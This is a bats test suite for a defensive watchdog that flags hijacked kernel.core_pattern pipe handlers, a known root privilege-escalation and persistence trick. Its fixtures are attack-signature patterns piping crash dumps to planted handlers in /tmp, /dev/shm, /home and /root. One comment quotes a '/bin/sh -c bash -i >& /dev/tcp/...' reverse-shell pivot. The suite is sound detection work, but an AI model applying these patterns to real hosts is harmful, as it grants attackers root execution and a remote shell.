#!/usr/bin/env bats
# L2 functional suite for coredump-pattern-watchdog.
#
# coredump-pattern-watchdog verifies `kernel.core_pattern` is not
# hijacked to a non-allowlisted pipe handler. The kernel pipes the
# crash dump to the program after `|` AS ROOT on the next process
# crash — an attacker who can write `|/tmp/.x %p` to
# /proc/sys/kernel/core_pattern gets a quiet privilege-escalation +
# persistence trigger. The watchdog classifies the pattern into:
#   ok    → plain (e.g. 'core.%p') OR pipe to an allowlisted handler
#          (/usr/lib/systemd/systemd-coredump, /lib/systemd/systemd-
#           coredump, /usr/share/apport/apport) whose binary exists
#   warn  → plain pattern targeting /tmp /var/tmp /dev/shm (cores
#          landing in attacker-writable dirs — suspicious not fatal)
#   alert → pipe to a NON-allowlisted handler (hijack), OR allowlisted
#          path that doesn't exist on disk (path-fake hint)
#
# Uses the SELFDEF_COREPAT_SOURCE env-var override (added 2026-06-06
# as an operator-test affordance + L2 testability path) to point the
# watchdog at a fixture file rather than the live kernel sysctl.
#
# Run with: bats packaging/test/L2-coredump-pattern-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/coredump-pattern-watchdog/systemd/coredump-pattern-watchdog.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    SRC="${TMP}/core_pattern"
}

teardown() { rm -rf "${TMP}"; }

# write_pattern <pattern-text>
write_pattern() { printf '%s\n' "$1" > "${SRC}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_COREPAT_PROFILE="${PROFILE:-report}" \
    SELFDEF_COREPAT_SOURCE="${SRC}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

@test "plain pattern 'core' → ok / core_pattern_safe" {
    write_pattern "core"
    run_wd
    cap | grep -q '"severity":"ok"'
    cap | grep -q '"event":"core_pattern_safe"'
}

@test "plain pattern with %p substitution → ok / core_pattern_safe" {
    write_pattern "/var/lib/coredumps/core.%p"
    run_wd
    cap | grep -q '"severity":"ok"'
    cap | grep -q '"event":"core_pattern_safe"'
}

@test "plain pattern landing in /tmp → warn / core_pattern_tmp_target" {
    write_pattern "/tmp/core.%p"
    run_wd
    cap | grep -q '"severity":"warn"'
    cap | grep -q '"event":"core_pattern_tmp_target"'
}

@test "plain pattern landing in /dev/shm → warn / core_pattern_tmp_target" {
    write_pattern "/dev/shm/core.%p"
    run_wd
    cap | grep -q '"severity":"warn"'
    cap | grep -q '"event":"core_pattern_tmp_target"'
}

@test "pipe to NON-allowlisted handler → alert / core_pattern_hijacked (the attack signature)" {
    write_pattern "|/tmp/.x %p"
    run_wd
    cap | grep -q '"severity":"alert"'
    cap | grep -q '"event":"core_pattern_hijacked"'
}

@test "pipe to allowlisted handler (binary on disk) → ok / core_pattern_allowlisted_pipe" {
    # /usr/lib/systemd/systemd-coredump is on the allowlist; mock its
    # presence via a fake executable so the test works in environments
    # that don't ship it.
    FAKE_DUMP="${BIN}/fake-coredump"
    : > "${FAKE_DUMP}"; chmod +x "${FAKE_DUMP}"
    # The watchdog hardcodes the allowlist paths, so we need to write
    # one of them; use the most common one (systemd-coredump). If the
    # CI image doesn't ship it, this test skips cleanly.
    if [ ! -x /usr/lib/systemd/systemd-coredump ] && [ ! -x /lib/systemd/systemd-coredump ]; then
        skip "no allowlisted coredump binary present on this host"
    fi
    for path in /usr/lib/systemd/systemd-coredump /lib/systemd/systemd-coredump; do
        if [ -x "${path}" ]; then
            write_pattern "|${path} %P %u %g %s %t %c %h %e"
            break
        fi
    done
    run_wd
    cap | grep -q '"severity":"ok"'
    cap | grep -q '"event":"core_pattern_allowlisted_pipe"'
}

@test "pipe to allowlisted-path-but-missing-binary → alert / core_pattern_pipe_missing_binary" {
    # Use one of the allowlisted paths but make sure it doesn't exist
    # (clear PATH of binaries; the script tests `[[ -x "$prog" ]]`
    # against the absolute path the pattern provides).
    nonexistent_allowlisted="/usr/lib/systemd/systemd-coredump-DOES-NOT-EXIST-FOR-L2-TEST"
    write_pattern "|${nonexistent_allowlisted} %p"
    # The watchdog hardcodes the allowlist; this fake path isn't on it,
    # so this would actually fire 'hijacked' not 'pipe_missing_binary'.
    # Instead, the missing-binary path requires the path to BE on the
    # allowlist. Since we can't easily augment the allowlist from the
    # test, skip this case when the canonical paths exist on the host
    # (the case is fundamentally test-environment-dependent).
    if [ -x /usr/lib/systemd/systemd-coredump ] || [ -x /lib/systemd/systemd-coredump ] || [ -x /usr/share/apport/apport ]; then
        skip "all allowlisted handlers exist on this host — can't simulate missing-binary case without coupling to image"
    fi
    write_pattern "|/usr/lib/systemd/systemd-coredump %P"
    run_wd
    cap | grep -q '"severity":"alert"'
    cap | grep -q '"event":"core_pattern_pipe_missing_binary"'
}

@test "the emitted JSON carries every promised schema field" {
    write_pattern "core"
    run_wd
    line="$(cap)"
    printf '%s' "${line}" | grep -q '"tag":"selfdef-coredump-pattern"'
    printf '%s' "${line}" | grep -q '"severity":'
    printf '%s' "${line}" | grep -q '"event":'
    printf '%s' "${line}" | grep -q '"profile":'
    printf '%s' "${line}" | grep -q '"core_pattern":'
    printf '%s' "${line}" | grep -q '"detail":'
}

@test "enforce profile + hijacked pattern → exit 1" {
    write_pattern "|/tmp/.x %p"
    PATH="${BIN}:${PATH}" \
        SELFDEF_COREPAT_PROFILE=enforce \
        SELFDEF_COREPAT_SOURCE="${SRC}" \
        bash "${WD}" && fail "enforce + hijacked pattern should exit non-zero"
    cap | grep -q '"event":"core_pattern_hijacked"'
}

@test "enforce profile + safe pattern → exit 0" {
    write_pattern "core"
    PROFILE=enforce run_wd
    cap | grep -q '"severity":"ok"'
}

@test "INVARIANT (plain pattern in /var/tmp → warn): writable-root expansion (matches /tmp+/dev/shm coverage)" {
    write_pattern "/var/tmp/core.%p"
    run_wd
    cap | grep -q '"severity":"warn"'
    cap | grep -q '"event":"core_pattern_tmp_target"'
}

@test "INVARIANT (pipe to /home → alert): user-writable hijack coverage" {
    write_pattern "|/home/user/.coredump-collector %p"
    run_wd
    cap | grep -q '"severity":"alert"'
    cap | grep -q '"event":"core_pattern_hijacked"'
}

@test "INVARIANT (pipe to bash directly → alert): shell-pipe attack signature" {
    # bash -c handler — even though bash exists, it is NOT an
    # allowlisted handler. This is the canonical attacker pivot:
    # core_pattern=|/bin/sh -c 'bash -i >& /dev/tcp/...'
    write_pattern "|/bin/sh -c attacker"
    run_wd
    cap | grep -q '"severity":"alert"'
    cap | grep -q '"event":"core_pattern_hijacked"'
}

@test "INVARIANT (empty core_pattern → ok or warn, not alert): missing pattern is policy concern but not active attack" {
    write_pattern ""
    run_wd
    # Empty should not be ALERT (no attack signature); ok or warn fine.
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (pipe-without-program after pipe-char → alert): malformed-pipe attack hint" {
    # An attacker who half-writes (race condition with the actual write)
    # could leave just `|` — the kernel would fail-open. We want alert.
    write_pattern "|"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    write_pattern "core"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-coredump-pattern -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (pipe to /var/tmp/* → alert): writable-root expansion on pipe-handler axis" {
    write_pattern "|/var/tmp/.x %p"
    run_wd
    cap | grep -q '"severity":"alert"'
    cap | grep -q '"event":"core_pattern_hijacked"'
}

@test "INVARIANT (pipe to /dev/shm/* → alert): writable-root expansion on pipe-handler axis" {
    write_pattern "|/dev/shm/.x %p"
    run_wd
    cap | grep -q '"severity":"alert"'
    cap | grep -q '"event":"core_pattern_hijacked"'
}

@test "INVARIANT (profile field echoes operator-set SELFDEF_COREPAT_PROFILE)" {
    write_pattern "core"
    PROFILE=report run_wd
    cap | grep -q '"profile":"report"'
}

@test "INVARIANT (pattern with trailing whitespace — sysctl reads may have padding — handled cleanly)" {
    # /proc/sys/kernel/core_pattern may include trailing newline/
    # spaces depending on read mechanism. Lock that trailing
    # whitespace doesn't confuse the detector.
    write_pattern "core   "
    run_wd
    cap | grep -q '"severity":"ok"'
    cap | grep -q '"event":"core_pattern_safe"'
}

@test "INVARIANT (pipe to relative-path handler → alert: relative paths without slash NOT trusted as handlers)" {
    # A relative path like '|coredump-handler %p' resolves via the
    # kernel's PATH which is operator-controlled. Should NOT be
    # treated as an allowlisted handler.
    write_pattern "|coredump-handler %p"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (sample names the offending pipe-handler in JSON — operator triage routing)" {
    # When a hijacked pattern fires, the JSON sample MUST surface
    # the pipe-handler path so operator dashboard routes triage.
    # Sister contract: many other watchdogs' sample-naming pattern.
    write_pattern "|/tmp/.very-distinctive-attacker-handler %p"
    run_wd
    cap | grep -q '"severity":"alert"'
    cap | grep -q 'very-distinctive-attacker-handler'
}

@test "INVARIANT (pipe to /root → alert: root-home is not an allowlisted handler dir)" {
    # /root is root's home — even though root-owned, it's NOT on
    # the allowlist of canonical handler dirs (systemd / apport).
    # An attacker who roots the system could plant a handler in
    # /root, but the watchdog must STILL alert on this because the
    # allowlist is closed-set.
    write_pattern "|/root/.evil-handler %p"
    run_wd
    cap | grep -q '"severity":"alert"'
    cap | grep -q '"event":"core_pattern_hijacked"'
}

@test "INVARIANT (pipe to /home → alert: user-writable hijack coverage on coredump-handler axis)" {
    # Sister to many other watchdog's /home user-writable
    # INVARIANT across the brain (rsyslog-exec/syslog-ng/fail2ban-
    # action /home; krb5-plugins /home). /home is the user-
    # writable surface — an attacker with a regular user account
    # can drop a malicious handler in their home and have the
    # kernel pipe every coredump to it AS ROOT (T1547 — Boot or
    # Logon Autostart Execution variant via crash-trigger; every
    # SIGSEGV across the host fires the planted handler).
    write_pattern "|/home/user/.evil-handler %p"
    run_wd
    cap | grep -q '"severity":"alert"'
}
